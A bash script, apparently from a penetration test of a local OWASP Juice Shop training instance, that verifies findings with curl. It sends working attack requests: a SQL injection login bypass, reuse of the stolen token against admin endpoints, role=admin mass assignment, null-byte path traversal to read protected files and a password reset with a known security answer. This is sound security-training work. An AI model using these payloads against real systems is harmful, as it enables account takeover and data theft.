#!/bin/bash
# Verify key findings with curl

BASE="http://127.0.0.1:3010"

echo "=== 1. Test SQLi Login Bypass ==="
echo "POST /rest/user/login with SQLi payload"
curl -s -X POST "$BASE/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"test"}' | head -c 500
echo ""

echo ""
echo "=== 2. Test Captcha endpoint ==="
echo "GET /rest/captcha"
curl -s "$BASE/rest/captcha"
echo ""

echo ""
echo "=== 3. Test FTP directory listing ==="
echo "GET /ftp/"
curl -s "$BASE/ftp/" | head -c 500
echo ""

echo ""
echo "=== 4. Test Null byte file access ==="
echo "GET /ftp/suspicious_errors.yml%2500.md"
curl -s --path-as-is "$BASE/ftp/suspicious_errors.yml%2500.md" | head -c 300
echo ""

echo ""
echo "=== 5. Test Security Question leak ==="
echo "GET /rest/user/security-question?email=admin@juice-sh.op"
curl -s "$BASE/rest/user/security-question?email=admin@juice-sh.op"
echo ""

echo ""
echo "=== 6. Test Mass Assignment ==="
echo "POST /api/Users with role=admin"
curl -s -X POST "$BASE/api/Users" \
  -H "Content-Type: application/json" \
  -d '{"email":"testmass_$(date +%s)@test.com","password":"test123","role":"admin"}' | head -c 500
echo ""

echo ""
echo "=== 7. Test Password Change via GET ==="
# First get a token via SQLi
TOKEN=$(curl -s -X POST "$BASE/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"test"}' | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token','NO_TOKEN'))" 2>/dev/null)
echo "Got token: ${TOKEN:0:30}..."
echo "GET /rest/user/change-password with token"
curl -s "$BASE/rest/user/change-password?current=admin123&new=newpass123&repeat=newpass123" \
  -H "Authorization: Bearer $TOKEN" | head -c 300
echo ""

echo ""
echo "=== 8. Test Whoami ==="
curl -s "$BASE/rest/user/whoami" \
  -H "Authorization: Bearer $TOKEN" | head -c 300
echo ""

echo ""
echo "=== 9. Test Challenges API ==="
curl -s "$BASE/api/Challenges" \
  -H "Authorization: Bearer $TOKEN" | head -c 500
echo ""

echo ""
echo "=== 10. Test Products API ==="
curl -s "$BASE/api/Products" | head -c 300
echo ""

echo ""
echo "=== 11. Test Feedbacks API ==="
curl -s "$BASE/api/Feedbacks" | head -c 300
echo ""

echo ""
echo "=== 12. Test Directory listing - quarantine ==="
curl -s "$BASE/ftp/quarantine/" | head -c 500
echo ""

echo ""
echo "=== 13. Test null byte on coupons file ==="
curl -s --path-as-is "$BASE/ftp/coupons_2013.md.bak%2500.md" | head -c 300
echo ""

echo ""
echo "=== 14. Test no logout endpoint ==="
curl -s -X POST "$BASE/rest/user/logout" -H "Authorization: Bearer $TOKEN"
echo ""

echo ""
echo "=== 15. Test password reset ==="
curl -s -X POST "$BASE/rest/user/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"bjoern@owasp.org","answer":"Zaya","new":"test999","repeat":"test999"}'
echo ""

echo ""
echo "=== 16. Test application configuration ==="
curl -s "$BASE/rest/admin/application-configuration" \
  -H "Authorization: Bearer $TOKEN" | head -c 500
echo ""

echo ""
echo "=== 17. Test application version ==="
curl -s "$BASE/rest/admin/application-version" \
  -H "Authorization: Bearer $TOKEN"
echo ""

echo ""
echo "=== 18. Test Users API (authorized) ==="
curl -s "$BASE/api/Users" \
  -H "Authorization: Bearer $TOKEN" | head -c 500
echo ""
